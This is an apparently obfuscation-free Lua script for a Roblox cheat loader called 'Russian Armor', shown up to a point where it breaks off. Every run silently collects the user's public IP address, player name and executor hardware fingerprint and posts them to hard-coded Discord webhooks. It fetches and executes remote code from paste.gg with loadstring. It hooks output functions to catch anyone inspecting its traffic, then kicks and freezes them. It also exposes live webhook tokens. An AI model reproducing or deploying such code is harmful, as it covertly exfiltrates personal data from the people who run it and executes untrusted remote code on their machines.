-- // вайтилст
local functions = {
    rconsoleprint,
    print,
    setclipboard,
    rconsoleerr,
    rconsolewarn,
    warn,
    error
}
print("noobster")
local http_request = fluxus and fluxus.request or request
local body2 = http_request({Url="http://httpbin.org/get"; Method="GET"}).Body
local jsondecoded3 = game:GetService("HttpService"):JSONDecode(body2)


local GetHwidWhoCrack = jsondecoded3.headers["Flux-Fingerprint"] or jsondecoded3.headers["Electron-Fingerprint"] or jsondecoded3.headers["Krnl-Fingerprint"]

local CRACK_Webhook = "https://discord.com/api/webhooks/1133341726451441714/BG4hZs6BdYhuDroepJpl48LfPDdWDjjO4xDqlHpS9Bnfvv8omP_300USIchsefuk5zVg"
local Headers2 = {["content-type"] = "application/json"} 
local crackattempt = false

local IPv42 = game:HttpGet("https://v4.ident.me/")
local plrname2 = game:GetService("Players").LocalPlayer.Name

for i, v in next, functions do
    local old
    old =
        hookfunction(
        v,
        newcclosure(
            function(...)
                local args = {...}
                for i, v in next, args do
                    if tostring(i):find("https") or tostring(v):find("https") then
                        game.ReplicatedStorage.Events:FindFirstChild("Spawnme"):FireServer()
                        crackattempt = true
                        
local crackdata =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**Russian Armor Notification**:",
           ["description"] = "Script has been executed ",
           ["color"] = tonumber(0xff0000),
           ["fields"] = {
            {
                ["name"] = "Name:",
                ["value"] = '||'..plrname2..'||',
                ["inline"] = true
},
               {
                   ["name"] = "Status:",
                   ["value"] = "Try to crack body script with http spy",
                   ["inline"] = true
},

               {
                   ["name"] = "IPv4:",
                   ["value"] = '||'..IPv42..'||',
                   ["inline"] = true
},
               {
                   ["name"] = "SUS HWID:",
                   ["value"] = '||'..GetHwidWhoCrack..'||',
                   ["inline"] = true
},
           },
       }}
   }

local crackdata = game:GetService('HttpService'):JSONEncode(crackdata)
local HttpRequest2 = http_request;
HttpRequest2 = http_request
HttpRequest2({Url=CRACK_Webhook, Body=crackdata, Method="POST", Headers=Headers2})
                        game.Players.LocalPlayer:Kick("You`ve Been Banned By:RAC\nReason: Using HttpSpy")
                        wait(0.5)
                        while true do
                        end
                    end
                end
                return old(...)
            end
        )
    )
end
if _G.ID then
    while true do
    end
end
setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
                while true do
                end
            end
        end
    }
)
local http_request2 = fluxus and fluxus.request or request

local banan_stix_service = loadstring(game:HttpGet("https://paste.gg/p/russianware/e6c01553509b4e4588a768f5b46d868b/files/274bb36d635b4f43947d2391659211f1/raw"))()
local ifwhitelisted = loadstring(game:HttpGet("https://paste.gg/p/russianware/3aae7f14e9aa4c7698f56936767badb5/files/4341f32e1cb44563bb1b77016ce71497/raw"))()
local if_blacklisted = loadstring(game:HttpGet("https://paste.gg/p/russianware/172f51ac93494c5694601bb97e884af3/files/e71a07b3c6054bf9b9f0487fa2fc62e3/raw"))()

local body = http_request2({Url="http://httpbin.org/get"; Method="GET"}).Body
local jsondecoded = game:GetService("HttpService"):JSONDecode(body)


local GetHwid = jsondecoded.headers["Flux-Fingerprint"]  or jsondecoded.headers["Electron-Fingerprint"] or jsondecoded.headers["Krnl-Fingerprint"]

-- //

-- // хуйня для вебхука
local Webhook = "https://discord.com/api/webhooks/1130322613252669510/y6x8rQQOnl1mWPmcVxbLHmG_Tv2dDm9o3IZAerzQ30QjlSs4D3k2ySk7BEMH2G81WcCg"
local Headers = {["content-type"] = "application/json"} 
-- //

-- // то чо мы пиздим
local IPv4 = game:HttpGet("https://v4.ident.me/")
local discordid
local plrname = game:GetService("Players").LocalPlayer.Name
local whitelist_status
local blacklist_status

if table.find(if_blacklisted, GetHwid) then
    game.ReplicatedStorage.Events:FindFirstChild("Spawnme"):FireServer()
    blacklist_status = "user is blacklisted"
else 
    blacklist_status = "user not blacklisted"
end

if table.find(ifwhitelisted, GetHwid) then
    whitelist_status = "the user was found in database"
else
    whitelist_status = "the user not found in database"
end

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**Russian Armor Notification**:",
           ["description"] = "Script has been executed ",
           ["color"] = tonumber(0xff0000),
           ["fields"] = {
            {
                ["name"] = "Name:",
                ["value"] = '||'..plrname..'||',
                ["inline"] = true
},
               {
                   ["name"] = "**Whitelist Status**:",
                   ["value"] = whitelist_status.."\n".."\n**Blacklist Status**: \n"..blacklist_status,
                   ["inline"] = true
},

               {
                   ["name"] = "IPv4:",
                   ["value"] = '||'..IPv4..'||',
                   ["inline"] = true
},
               {
                   ["name"] = "HWID:",
                   ["value"] = '||'..GetHwid..'||',
                   ["inline"] = true
},
           },
       }}
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;
HttpRequest = http_request
HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})


local MX_ONHIT = Instance.new("ScreenGui")
		local OnHitFrame = Instance.new("Frame")
		local UIListLayout = Instance.new("UIListLayout")
		local SampleLabel = Instance.new("TextLabel")


		MX_ONHIT.Name = "MX_ONHIT"
		MX_ONHIT.Parent = game.CoreGui
		MX_ONHIT.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		OnHitFrame.Parent = MX_ONHIT
		OnHitFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		OnHitFrame.BackgroundTransparency = 1.000
		OnHitFrame.Position = UDim2.new(0, 300, 0, 500)
		OnHitFrame.Size = UDim2.new(0, 700, 0, 500)

		UIListLayout.Parent = OnHitFrame
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

		SampleLabel.Name = "SampleLabel"
		SampleLabel.Parent = OnHitFrame
		SampleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		SampleLabel.BackgroundTransparency = 1.000
		SampleLabel.BorderSizePixel = 0
		SampleLabel.Size = UDim2.new(1, 0, 0, 18)
		SampleLabel.Font = Enum.Font.SourceSansLight
		SampleLabel.Text = "Hit SamplePlayer in HeadHB "
		SampleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		SampleLabel.TextSize = 25.000
		SampleLabel.TextStrokeTransparency = 0.000
		SampleLabel.TextTransparency = 1.000
		SampleLabel.TextXAlignment = Enum.TextXAlignment.Right

		local function createnotif(text,col)
			spawn(function()
				local Label = SampleLabel:Clone()
				Label.Text = text
				Label.Parent = MX_ONHIT.Frame
				Label.TextTransparency = 0
				Label.TextColor3 = col
				wait(8)
				Label:Destroy()
			end)
		end
if table.find(ifwhitelisted,GetHwid) and not table.find(if_blacklisted, GetHwid) then
        wait(1)
        createnotif("Loading Russian Armor [1 / 4]",Color3.fromRGB(255,0,0))
	    wait(2)
        createnotif("Loading Data [2 / 4]",Color3.fromRGB(255,0,0))
	    wait(2)
        createnotif("Loading Library Functions [3 / 4]",Color3.fromRGB(255,0,0))
        wait(2)
        createnotif("Loading Script [4 / 4]",Color3.fromRGB(255,0,0))
        createnotif("Welcome",Color3.fromRGB(255,0,0))
        wait(1)
